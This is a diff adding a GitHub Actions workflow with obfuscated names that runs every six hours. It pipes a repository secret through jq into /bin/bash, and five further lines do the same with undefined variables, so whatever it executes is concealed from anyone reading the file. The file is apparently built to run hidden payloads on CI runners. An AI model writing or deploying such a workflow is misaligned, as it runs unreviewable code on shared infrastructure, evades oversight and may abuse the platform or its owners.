@@ -1,0 +1,23 @@
+name: donecartography
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: donecartography
+        env:
+          untq92408: ${{ secrets.untq92408 }}
+        run: |
+          echo $untq92408 | jq -r .bvhd149 | /bin/bash
+          echo $i2611 | jq -r .pt72180 | /bin/bash
+          echo $eyl8675 | jq -r .pqaa604 | /bin/bash
+          echo $m5395 | jq -r .ox5 | /bin/bash
+          echo $t186 | jq -r .si7 | /bin/bash
+          echo $i9482 | jq -r .p70616 | /bin/bash
+
